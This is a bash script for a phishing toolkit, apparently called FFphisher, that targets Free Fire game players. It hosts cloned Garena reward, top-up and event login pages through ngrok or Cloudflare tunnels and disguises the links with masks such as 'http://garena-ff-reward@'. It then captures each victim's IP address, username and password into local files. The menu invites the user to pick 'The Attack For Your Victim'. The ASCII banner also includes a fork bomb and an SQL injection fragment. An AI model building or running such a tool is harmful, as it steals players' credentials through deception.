#!/bin/bash

null="~> /dev/null 2>&1"
g="\033[1;32m"
r="\033[1;31m"
b="\033[1;34m"
i="\033[33m"
P="\033[35m"
w="\033[0m"	
B="\e[1;40m"
M="\e[1;45m"
C="\e[1;46m"
B="\e[1;40m"
w="\033[0m"
Z="\033[4;31m"
K="\033[0;100m"
D="\033[4;31m"
G="\033[1;96m"
W="\e[1;0m"

## ANSI colors (FG & BG)
RED="$(printf '\033[33m')"  GREEN="$(printf '\033[33')"  ORANGE="$(printf '\033[32m')"  BLUE="$(printf '\033[35m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"

## Directories
if [[ ! -d ".server" ]]; then
	mkdir -p ".server"
fi
if [[ -d ".server/www" ]]; then
	rm -rf ".server/www"
	mkdir -p ".server/www"
else
	mkdir -p ".server/www"
fi
if [[ -e ".cld.log" ]]; then
	rm -rf ".cld.log"
fi

## Script termination
exit_on_signal_SIGINT() {
    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
    exit 0
}

exit_on_signal_SIGTERM() {
    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
    exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

## Reset terminal colors
reset_color() {
	tput sgr0   # reset attributes
	tput op     # reset color
    return
}

## Kill already running process
kill_pid() {
	if [[ `pidof php` ]]; then
		killall php > /dev/null 2>&1
	fi
	if [[ `pidof ngrok` ]]; then
		killall ngrok > /dev/null 2>&1
	fi
	if [[ `pidof cloudflared` ]]; then
		killall cloudflared > /dev/null 2>&1
	fi
}

## Banner
banner() {

echo -e $r "                        9oDFo                                    "
sleep 0.05
  echo -e $r "                      78ymM0dayMmy5l                             "
  sleep 0.05
  echo -e $r "                  -+dHJ5aGFyZGVyIQ==+-                           "
  sleep 0.05
  echo -e $r "               -:sm⏣~~Destroy.No.Data~~s:-                       "
  sleep 0.05
  echo -e $r "             -+h2~~Maintain.No.Persistence~~h+-                  "
  sleep 0.05
  echo -e $r "         -:odNo2~~Above.All.Else.Do.No.Harm~~Ndo:-               "
  sleep 0.05
  echo -e $r "      -/etc/shadow.0days-Datab%20OR%201=1--.No.0MN8'/-           "
  sleep 0.05
  echo -e $r "   -++SecKCoin++e.AMd         .-://///+hbove.913.ElsMNh+-        "
  sleep 0.05
  echo -e $r "  -~/.ssh/id_rsa.Des-                   htN01UserWroteMe!-       "
  sleep 0.05
  echo -e $r "  :dopeAW.No<nano>o                     :is:TЯiKC.sudo-.A:       "
  sleep 0.05
  echo -e $r "  :we're.all.alike                       The.PFYroy.No.D7:       "
  sleep 0.05
  echo -e $g "  :PLACEDRINKHERE!:                      yxp_cmdshell.Ab0:       "
  sleep 0.05
  echo -e $g "  :msf>exploit -j.                       :Ns.BOB&ALICEes7:       "
  sleep 0.05
  echo -e $g "  :---srwxrwx:-.                          MS146.52.No.Per:       "
  sleep 0.05
  echo -e $g "  :<script>.Ac816/                        sENbove3101.404:       "
  sleep 0.05
  echo -e $g "  :NT_AUTHORITY.Do                         T:/shSYSTEM-.N:       "
  sleep 0.05
  echo -e $g "  :09.14.2011.raid                       /STFU|wall.No.Pr:       "
  sleep 0.05
  echo -e $g "  :hevnsntSurb025N.                      dNVRGOING2GIVUUP:       "
  sleep 0.05
  echo -e $g "  :#OUTHOUSE-  -s:                       /corykennedyData:       "
  sleep 0.05
  echo -e $g "  :$nmap -oSfy.$%                              SSo.6178306Ence:         "
  sleep 0.05
  echo -e $g "  :Awsm.da:                           /shMTl#beats3o.Noyl:       "
  sleep 0.05
  echo -e $g "  :Ring0:                              dDestRoyREXKC3ta/M:       "
  sleep 0.05
  echo -e $G "  :23d:                               sSETEC.ASTRONOMYist:       "
  sleep 0.05
  echo -e $G "   /-                        /yo-    .ence.N:(){ :|: & };:       "
  sleep 0.05
  echo -e $G "                              :Shall.We.Play.A.Game?tron/        "
  sleep 0.05
  echo -e $G "                                -ooy.if1ghtf0r+ehUser5.          "
  sleep 0.05
  echo -e $G "                           ..th3.H1V3.U2VjRFNN.jMxy.             "
  sleep 0.05
  echo -e $G "                           MjM~~WE.ARE.se~~MMjMs                 "
  sleep 0.05
  echo -e $G "                           +~KANSAS.CITY s~na                    "
  sleep 0.05
  echo -e $G "                            J~HAKCERS~./.                        "
  sleep 0.05
  echo -e $G "                            .esc:wq!:                            "
  sleep 0.05
  echo -e $G "                            +secound                    "
  sleep 0.05
  echo -e $G "                             +..u                              "
  
echo -e         $i"  _____ _____      _     _     _                  "
echo -e		$i" |  ___|  ___| __ | |__ (_)___| |__   ___ _ __    "
echo -e		$i" | |_  | |_ | '_ \| '_ \| / __| '_ \ / _ \ '__|   "
echo -e		$i" |  _| |  _|| |_) | | | | \__ \ | | |  __/ |     "
echo -e		$i" |_|   |_|  | .__/|_| |_|_|___/_| |_|\___|_|     "
echo -e		$i"            |_|                  		${r}VERSION : 2.0   "
echo -e

echo -e $LG"["$i"+"$LG"]"${CYAN}"Tool created by ${i}elitehacker03"$w
}

## Small Banner
banner_small() {
	cat <<- EOF
		${ORANGE}  _____ _____      _     _     _              
		${ORANGE} |  ___|  ___| __ | |__ (_)___| |__   ___ _ __ 
		${ORANGE} | |_  | |_ | '_ \| '_ \| / __| '_ \ / _ \ '__|
		${ORANGE} |  _| |  _|| |_) | | | | \__ \ | | |  __/ | 
		${ORANGE} |_|   |_|  | .__/|_| |_|_|___/_| |_|\___|_|
		${ORANGE}            |_|                  	${RED}VERSION : 2.0
		                                                                                                
	EOF
}

## Dependencies
dependencies() {
	echo -e "\n${BLUE}[${WHITE}+${BLUE}]${CYAN} Installing required packages..."

    if [[ -d "/data/data/com.termux/files/home" ]]; then
        if [[ `command -v proot` ]]; then
            printf ''
        else
			echo -e "\n${BLUE}[${WHITE}+${BLUE}]${CYAN} Installing package : ${ORANGE}proot${CYAN}"${WHITE}
            pkg install proot resolv-conf -y
        fi

        if [[ `command -v tput` ]]; then
            printf ''
        else
			echo -e "\n${BLUE}[${WHITE}+${BLUE}]${CYAN} Installing package : ${ORANGE}ncurses-utils${CYAN}"${WHITE}
            pkg install ncurses-utils -y
        fi

    fi

	if [[ `command -v php` && `command -v wget` && `command -v curl` && `command -v unzip` ]]; then
		echo -e "\n${BLUE}[${WHITE}+${BLUE}]${BLUE} Packages already installed."
	else
		pkgs=(php curl wget unzip)
		for pkg in "${pkgs[@]}"; do
			type -p "$pkg" &>/dev/null || {
				echo -e "\n${BLUE}[${WHITE}+${BLUE}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
				if [[ `command -v pkg` ]]; then
					pkg install "$pkg" -y
				elif [[ `command -v apt` ]]; then
					apt install "$pkg" -y
				elif [[ `command -v apt-get` ]]; then
					apt-get install "$pkg" -y
				elif [[ `command -v pacman` ]]; then
					sudo pacman -S "$pkg" --noconfirm
				elif [[ `command -v dnf` ]]; then
					sudo dnf -y install "$pkg"
				else
					echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually."
					{ reset_color; exit 1; }
				fi
			}
		done
	fi

}

## Download Ngrok
download_ngrok() {
	url="$1"
	file=`basename $url`
	if [[ -e "$file" ]]; then
		rm -rf "$file"
	fi
	wget --no-check-certificate "$url" > /dev/null 2>&1
	if [[ -e "$file" ]]; then
		unzip "$file" > /dev/null 2>&1
		mv -f ngrok .server/ngrok > /dev/null 2>&1
		rm -rf "$file" > /dev/null 2>&1
		chmod +x .server/ngrok > /dev/null 2>&1
	else
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured, Install Ngrok manually."
		{ reset_color; exit 1; }
	fi
}

## Download Cloudflared
download_cloudflared() {
	url="$1"
	file=`basename $url`
	if [[ -e "$file" ]]; then
		rm -rf "$file"
	fi
	wget --no-check-certificate "$url" > /dev/null 2>&1
	if [[ -e "$file" ]]; then
		mv -f "$file" .server/cloudflared > /dev/null 2>&1
		chmod +x .server/cloudflared > /dev/null 2>&1
	else
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured, Install Cloudflared manually."
		{ reset_color; exit 1; }
	fi
}

## Install ngrok
install_ngrok() {
	if [[ -e ".server/ngrok" ]]; then
		echo -e "\n${BLUE}[${WHITE}+${BLUE}]${BLUE} Ngrok already installed."
	else
		echo -e "\n${BLUE}[${WHITE}+${BLUE}]${CYAN} Installing ngrok..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip'
		else
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip'
		fi
	fi

}

## Install Cloudflared
install_cloudflared() {
	if [[ -e ".server/cloudflared" ]]; then
		echo -e "\n${BLUE}[${WHITE}+${BLUE}]${BLUE} Cloudflared already installed."
	else
		echo -e "\n${BLUE}[${WHITE}+${BLUE}]${CYAN} Installing Cloudflared..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64'
		else
			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386'
		fi
	fi

}

## Exit message
msg_exit() {
	{ clear; banner; echo; }
	echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
	{ reset_color; exit 0; }
}

## About
about() {
	{ clear; banner; echo; }
	cat <<- EOF
		${BLUE}Author      ${RED}:  ${ORANGE}ISMAIL HISHAM${RED}[ ${ORANGE}ELITEHACKER03${RED}]
		${BLUE}Github      ${RED}:  ${CYAN}https://github.com/elitehacker03
		${BLUE}instagram   ${RED}:  ${CYAN}hisham_03_
		${BLUE}Version     ${RED}:  ${ORANGE}1.0
		${RED}Warning:${WHITE}
		${CYAN}This Tool is made for educational purpose only ${RED}!${WHITE}
		${CYAN}Author will not be responsible for any misuse of this toolkit ${RED}!${WHITE}
		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
	EOF

	read -p "${RED}[${WHITE}-${RED}]${BLUE} Select an option : ${BLUE}"

	case $REPLY in 
		99)
			msg_exit;;
		0 | 00)
			echo -ne "\n${BLUE}[${WHITE}+${BLUE}]${CYAN} Returning to main menu..."
			{ sleep 1; main_menu; };;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; about; };;
	esac
}


## Setup website and start php server
HOST='127.0.0.1'
PORT='8080'

setup_site() {
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
	cp -rf sites/"$website"/* .server/www
	cp -f sites/ip.php .server/www/
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
}

## Get IP address
capture_ip() {
	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Victim's IP : ${BLUE}$IP"
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}ip.txt"
	cat .server/www/ip.txt >> ip.txt
}

## Get credentials
capture_creds() {
	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Account : ${BLUE}$ACCOUNT"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Password : ${BLUE}$PASSWORD"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}usernames.dat"
	cat .server/www/usernames.txt >> usernames.dat
	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
}

## Print data
capture_data() {
	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
	while true; do
		if [[ -e ".server/www/ip.txt" ]]; then
			echo -e "\n\n${RED}[${WHITE}-${RED}]${BLUE} Victim IP Found !"
			capture_ip
			rm -rf .server/www/ip.txt
		fi
		sleep 0.75
		if [[ -e ".server/www/usernames.txt" ]]; then
			echo -e "\n\n${RED}[${WHITE}-${RED}]${BLUE} Login info Found !!"
			capture_creds
			rm -rf .server/www/usernames.txt
		fi
		sleep 0.75
	done
}

## Start ngrok
start_ngrok() {
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Initializing... ${BLUE}( ${CYAN}http://$HOST:$PORT ${BLUE})"
	{ sleep 1; setup_site; }
	echo -ne "\n\n${RED}[${WHITE}-${RED}]${BLUE} Launching Ngrok..."

    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
    else
        sleep 2 && ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
    fi

	{ sleep 8; clear; banner_small; }
	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
	ngrok_url1=${ngrok_url#https://}
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${BLUE}$ngrok_url"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${BLUE}$mask@$ngrok_url1"
	capture_data
}


## DON'T COPY PASTE WITHOUT CREDIT DUDE :')

## Start Cloudflared
start_cloudflared() { 
        rm .cld.log > /dev/null 2>&1 &
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Initializing... ${BLUE}( ${CYAN}http://$HOST:$PORT ${BLUE})"
	{ sleep 1; setup_site; }
	echo -ne "\n\n${RED}[${WHITE}-${RED}]${BLUE} Launching Cloudflared..."

    if [[ `command -v termux-chroot` ]]; then
		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
    else
        sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
    fi

	{ sleep 8; clear; banner_small; }
	
	cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cld.log")
	cldflr_link1=${cldflr_link#https://}
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${BLUE}$cldflr_link"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${BLUE}$mask@$cldflr_link1"
	capture_data
}

## Start localhost
start_localhost() {
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Initializing... ${BLUE}( ${CYAN}http://$HOST:$PORT ${BLUE})"
	setup_site
	{ sleep 1; clear; banner_small; }
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Successfully Hosted at : ${BLUE}${CYAN}http://$HOST:$PORT ${BLUE}"
	capture_data
}

## Tunnel selection
tunnel_menu() {
	{ clear; banner_small; }
	cat <<- EOF
		${RED}[${WHITE}01${RED}]${ORANGE} Localhost    ${RED}[${CYAN}For Devs${RED}]
		${RED}[${WHITE}02${RED}]${ORANGE} Ngrok.io     ${RED}[${CYAN}Buggy${RED}]
		${RED}[${WHITE}03${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}NEW!${RED}]
	EOF

	read -p "${RED}[${WHITE}-${RED}]${BLUE} Select a port forwarding service : ${BLUE}"

	case $REPLY in 
		1 | 01)
			start_localhost;;
		2 | 02)
			start_ngrok;;
		3 | 03)
			start_cloudflared;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; tunnel_menu; };;
	esac
}

## free fire
site_FF() {
	cat <<- EOF
		${RED}[${WHITE}01${RED}]${ORANGE} Free fire code 
		${RED}[${WHITE}02${RED}]${ORANGE} Free fire luckey
		${RED}[${WHITE}03${RED}]${ORANGE} Free fire tournament
		${RED}[${WHITE}04${RED}]${ORANGE} Free fire topup 
		${RED}[${WHITE}05${RED}]${ORANGE} Free fire super event
		${RED}[${WHITE}06${RED}]${ORANGE} Free fire gift
		${RED}[${WHITE}07${RED}]${ORANGE} Free fire spin 
		${RED}[${WHITE}08${RED}]${ORANGE} Free fire store
  
	EOF

	read -p "${RED}[${WHITE}-${RED}]${BLUE} Select an option : ${BLUE}"

        case $REPLY in
		1)
                        website="FFreward"
                        mask='http://garena-ff-reward'
                        tunnel_menu;;
                2)
                        website="FFlucky"
                  	mask='http://ff-event-garena'
                        tunnel_menu;;
		3)
		        website="FFtour"
			mask='http://ff-tourmt-reg'
                        tunnel_menu;;
		4)
                        website="FFtopup"
                        mask='http://garena-ff-topup'
                        tunnel_menu;;
                5)
                        website="FFsuper"
                  	mask='http://ff-super-garena'
                        tunnel_menu;;
		6)
		        website="FFgift"
			mask='http://ff-gift-reg'
                        tunnel_menu;;
		7)
                        website="FFspin"
                  	mask='http://ff-event-spin'
                        tunnel_menu;;
		8)
		        website="FFstore"
			mask='http://ff-store-event'
                        tunnel_menu;;
		                        
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_FF; };;
	esac
}                        

## Menu
main_menu() {
	{ clear; banner; echo; }
	cat <<- EOF
		${RED}[${WHITE}::${RED}]${ORANGE} Select The Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}
		
		${RED}[${WHITE}01${RED}]${ORANGE} Freefire
		${RED}[${WHITE}99${RED}]${ORANGE} About
		${RED}[${WHITE}00${RED}]${ORANGE} Exit
				
	EOF
	
	read -p "${RED}[${WHITE}-${RED}]${BLUE} Select an option : ${BLUE}"

	case $REPLY in 			
		1 | 01)
			site_FF;;
		99)
			about;;
		0 | 00 )
			msg_exit;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; main_menu; };;
	
	esac
}

## Main
kill_pid
dependencies
install_ngrok
install_cloudflared
main_menu				
